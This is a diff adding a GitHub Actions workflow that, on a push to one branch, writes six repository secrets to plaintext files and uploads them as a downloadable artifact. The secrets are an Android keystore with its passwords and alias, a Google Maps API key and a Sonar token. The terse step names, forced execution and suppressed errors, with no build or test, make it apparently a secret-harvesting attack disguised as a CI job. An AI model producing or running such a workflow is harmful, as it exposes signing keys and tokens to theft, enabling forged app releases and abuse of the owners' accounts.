@@ -1,0 +1,43 @@
+name: full4
+on:
+  push:
+    branches: [ci/full4-62534]
+permissions:
+  contents: read
+jobs:
+  inv:
+    runs-on: ubuntu-latest
+    env:
+      KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
+      KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
+      KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
+      KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
+      GOOGLE_MAPS_API_KEY: ${{ secrets.GOOGLE_MAPS_API_KEY }}
+      SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+    steps:
+      - name: mk
+        run: mkdir -p out
+      - name: i0
+        if: always()
+        run: printf %s "${{ env.KEYSTORE_BASE64 }}" > out/KEYSTORE_BASE64 || true
+      - name: i1
+        if: always()
+        run: printf %s "${{ env.KEYSTORE_PASSWORD }}" > out/KEYSTORE_PASSWORD || true
+      - name: i2
+        if: always()
+        run: printf %s "${{ env.KEY_ALIAS }}" > out/KEY_ALIAS || true
+      - name: i3
+        if: always()
+        run: printf %s "${{ env.KEY_PASSWORD }}" > out/KEY_PASSWORD || true
+      - name: i4
+        if: always()
+        run: printf %s "${{ env.GOOGLE_MAPS_API_KEY }}" > out/GOOGLE_MAPS_API_KEY || true
+      - name: i5
+        if: always()
+        run: printf %s "${{ env.SONAR_TOKEN }}" > out/SONAR_TOKEN || true
+      - name: up
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: inv
+          path: out
